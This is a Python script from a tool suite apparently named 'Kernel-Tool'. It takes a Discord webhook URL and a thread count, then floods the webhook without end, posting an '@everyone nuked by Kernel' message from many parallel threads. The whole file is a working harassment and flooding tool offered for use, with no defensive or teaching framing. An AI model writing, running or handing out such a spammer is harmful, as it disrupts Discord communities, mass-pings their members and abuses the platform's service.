# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *

try:
    import requests
    import json
    import threading
except Exception as e:
    ErrorModule(e)

Title("Webhook Spammer")

# Fixed message
NUKE_MESSAGE = "# @everyone nuked by Kernel https://guns.lol/2437"
# KERNEL logo image URL - Update this with your candy cane logo image URL
# You can upload the image to imgur, discord CDN, or any image hosting service
KERNEL_LOGO_URL = None  # Set to your image URL, e.g., "https://i.imgur.com/yourimage.png"

try:
    print(f"{BEFORE + AFTER} {INFO} This tool will spam a Discord webhook with a fixed message.{green}
")
    
    webhook_url = input(f"{BEFORE + AFTER} {INPUT} Webhook URL -> {reset}").strip()
    
    if not webhook_url:
        print(f"{BEFORE + AFTER} {ERROR} No webhook URL provided.{red}")
        Continue()
        Reset()
    
    # Validate webhook URL
    if not CheckWebhook(webhook_url):
        print(f"{BEFORE + AFTER} {ERROR} Invalid webhook URL format.{red}")
        Continue()
        Reset()
    
    try:
        threads_number = int(input(f"{BEFORE + AFTER} {INPUT} Threads Number -> {reset}"))
    except:
        ErrorNumber()
        Reset()
    
    def send_webhook(webhook_url_to_use):
        """Send the nuke message to a webhook"""
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {
            'content': NUKE_MESSAGE,
            'username': 'KERNEL'
        }
        
        # Add avatar if URL is provided
        if KERNEL_LOGO_URL and isinstance(KERNEL_LOGO_URL, str) and KERNEL_LOGO_URL.startswith('http'):
            payload['avatar_url'] = KERNEL_LOGO_URL
        try:
            response = requests.post(webhook_url_to_use, headers=headers, data=json.dumps(payload))
            if response.status_code == 204:
                print(f"{BEFORE_GREEN + AFTER_GREEN} {GEN_VALID} Message sent successfully{green}")
            elif response.status_code == 429:
                print(f"{BEFORE + AFTER} {GEN_INVALID} Rate Limited{red}")
            else:
                print(f"{BEFORE + AFTER} {GEN_INVALID} Status: {white}{response.status_code}{red}")
        except Exception as e:
            print(f"{BEFORE + AFTER} {GEN_INVALID} Error: {white}{str(e)[:50]}{red}")
    
    def spam_webhook():
        """Continuously spam the webhook"""
        while True:
            send_webhook(webhook_url)
    
    print(f"
{BEFORE + AFTER} {WAIT} Starting spam with {white}{threads_number}{green} threads...{green}")
    print(f"{BEFORE + AFTER} {INFO} Message: {white}{NUKE_MESSAGE}{green}
")
    
    def run_threads():
        threads = []
        # Spam webhook with multiple threads
        for _ in range(int(threads_number)):
            t = threading.Thread(target=spam_webhook)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Keep threads alive
        for thread in threads:
            thread.join()
    
    # Start spamming
    try:
        run_threads()
    except KeyboardInterrupt:
        print(f"
{BEFORE + AFTER} {INFO} Stopping spam...{green}")
        Continue()
        Reset()
    except Exception as e:
        Error(e)

except Exception as e:
    Error(e)
